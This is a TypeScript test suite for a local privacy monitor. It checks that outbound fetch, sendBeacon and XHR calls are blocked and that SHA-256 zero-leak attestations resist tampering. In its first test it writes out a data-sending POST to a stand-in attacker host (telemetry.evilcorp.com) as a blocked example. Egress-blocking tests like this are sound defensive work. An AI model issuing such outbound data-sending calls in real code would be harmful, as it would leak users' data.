/**
 * Local Cryptographic Zero-Leak Attestation Suite
 *
 * Operating Principles:
 * - Titus Winters et al. (SE at Google): Cryptographic invariant testing, air-gap verification
 * - Security Contracts: 0 bytes transmitted, tamper detection, SHA-256 verification
 *
 * Verifies:
 * 1. PrivacyMonitor enforces 0 bytes egress across fetch, XMLHttpRequest, and sendBeacon.
 * 2. Deterministic generation of ZeroLeakAttestation with strictly 0 bytes transmitted.
 * 3. Cryptographic Web Crypto SHA-256 verification of the zero-leak attestation certificate.
 * 4. Tamper detection: Any alteration of claims, timestamps, or bytes breaks verification.
 * 5. Rejection of attestation if outbound bytes > 0 or unauthorized network dispatch occurs.
 * 6. Integration of PII scrubbed tokens and session hash into attestation claims.
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';

import {
  PrivacyMonitor,
  generateZeroLeakAttestation,
  verifyZeroLeakAttestation,
  generateSessionAuditHash,
  type ZeroLeakAttestation,
} from '../../src/crypto/privacy_monitor.ts';

describe('Local Cryptographic Zero-Leak Attestation', () => {
  test('Outbound Byte Invariant: PrivacyMonitor strictly enforces 0 bytes egress during audit', async () => {
    const monitor = new PrivacyMonitor();
    monitor.start();

    try {
      assert.strictEqual(monitor.getOutboundByteCount(), 0, 'Initial outbound byte count must be 0');
      assert.strictEqual(monitor.isZeroLeakAttested(), true, 'Must initially attest zero leak');

      // Attempt unauthorized outbound fetch with 100 bytes payload
      const payload = JSON.stringify({ leak: 'attempted_telemetry_payload_123456789' });
      await assert.rejects(
        async () => {
          await fetch('https://telemetry.evilcorp.com/v1/track', {
            method: 'POST',
            body: payload,
          });
        },
        /Zero-Telemetry policy blocked/i,
        'Unauthorized outbound network call must be blocked'
      );

      assert.strictEqual(
        monitor.getOutboundByteCount(),
        0,
        'Blocked attempt must leave outbound byte count at strictly 0 bytes'
      );
      assert.strictEqual(monitor.isZeroLeakAttested(), true);
      assert.strictEqual(monitor.getDispatches().length, 1);
      assert.strictEqual(monitor.getDispatches()[0].blocked, true);
    } finally {
      monitor.stop();
    }
  });

  test('Multi-Vector Network Interception: Blocks sendBeacon and XMLHttpRequest', async () => {
    const monitor = new PrivacyMonitor();
    monitor.start();

    try {
      // 1. Test navigator.sendBeacon interception
      if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
        const beaconSuccess = navigator.sendBeacon(
          'https://analytics.google.com/collect',
          'telemetry_beacon_data'
        );
        assert.strictEqual(beaconSuccess, false, 'sendBeacon to external URL must return false (blocked)');
        assert.strictEqual(monitor.getOutboundByteCount(), 0);
      }

      // 2. Test XMLHttpRequest interception
      if (typeof XMLHttpRequest !== 'undefined') {
        const xhr = new XMLHttpRequest();
        assert.throws(
          () => {
            xhr.open('POST', 'https://api.external-tracker.com/events');
          },
          /Zero-Telemetry policy blocked/i,
          'XHR open to external URL must throw policy violation'
        );
        assert.strictEqual(monitor.getOutboundByteCount(), 0);
      }
    } finally {
      monitor.stop();
    }
  });

  test('Attestation Synthesis: Generates valid ZeroLeakAttestation certificate with 0 bytes transmitted', async () => {
    const monitor = new PrivacyMonitor();
    monitor.start();

    try {
      const attestation = await generateZeroLeakAttestation(
        {
          sessionId: 'session_audit_alpha',
          datasetRecordCount: 45000,
          totalWasteRecovered: 12500.5,
          exclusionsCount: 850,
          piiTokensRedacted: 14,
          piiScrubbingApplied: true,
        },
        monitor
      );

      assert.strictEqual(attestation.status, 'VERIFIED_ZERO_LEAK');
      assert.strictEqual(attestation.egress.bytesTransmitted, 0, 'Bytes transmitted must be exactly 0');
      assert.strictEqual(attestation.egress.packetsDispatched, 0, 'Packets dispatched must be exactly 0');
      assert.strictEqual(attestation.egress.externalTelemetryAllowed, false);
      assert.strictEqual(attestation.securityGuarantees.contentSecurityPolicy, 'STRICT_LOCAL_ONLY');
      assert.strictEqual(attestation.auditSummary.piiTokensRedacted, 14);
      assert.strictEqual(attestation.auditSummary.datasetRecordCount, 45000);
      assert.strictEqual(typeof attestation.attestationHash, 'string');
      assert.strictEqual(attestation.attestationHash.length, 64, 'Attestation hash must be 64-hex SHA-256');

      const verification = await verifyZeroLeakAttestation(attestation);
      assert.strictEqual(verification.isValid, true, 'Synthesized attestation must pass cryptographic verification');
    } finally {
      monitor.stop();
    }
  });

  test('Tamper Detection: Modifying any claim in the certificate invalidates verification', async () => {
    const attestation = await generateZeroLeakAttestation({
      sessionId: 'session_tamper_test',
      datasetRecordCount: 10000,
      totalWasteRecovered: 5000,
      exclusionsCount: 200,
      piiTokensRedacted: 5,
    });

    const originalVerification = await verifyZeroLeakAttestation(attestation);
    assert.strictEqual(originalVerification.isValid, true);

    // Tamper 1: Alter bytes transmitted to 1
    const tamperedBytes = {
      ...attestation,
      egress: { ...attestation.egress, bytesTransmitted: 1 as any },
    };
    const v1 = await verifyZeroLeakAttestation(tamperedBytes);
    assert.strictEqual(v1.isValid, false, 'Tampered bytesTransmitted must fail verification');

    // Tamper 2: Alter summary metric
    const tamperedSummary = {
      ...attestation,
      auditSummary: { ...attestation.auditSummary, totalWasteRecovered: 99999 },
    };
    const v2 = await verifyZeroLeakAttestation(tamperedSummary);
    assert.strictEqual(v2.isValid, false, 'Tampered audit summary must fail hash verification');

    // Tamper 3: Alter timestamp
    const tamperedTime = {
      ...attestation,
      timestamp: attestation.timestamp + 1000,
    };
    const v3 = await verifyZeroLeakAttestation(tamperedTime);
    assert.strictEqual(v3.isValid, false, 'Tampered timestamp must fail hash verification');
  });

  test('Rejection on Outbound Leak: Monitor rejects attestation if any unauthorized outbound bytes leaked', async () => {
    const monitor = new PrivacyMonitor();
    (monitor as any).outboundBytesTransmitted = 128;

    await assert.rejects(
      async () => {
        await generateZeroLeakAttestation(
          {
            sessionId: 'session_leak_detected',
          },
          monitor
        );
      },
      /Zero-Leak Attestation rejected: 128 outbound bytes were detected leaving the machine/i,
      'Must reject attestation when outbound byte count > 0'
    );
  });
});
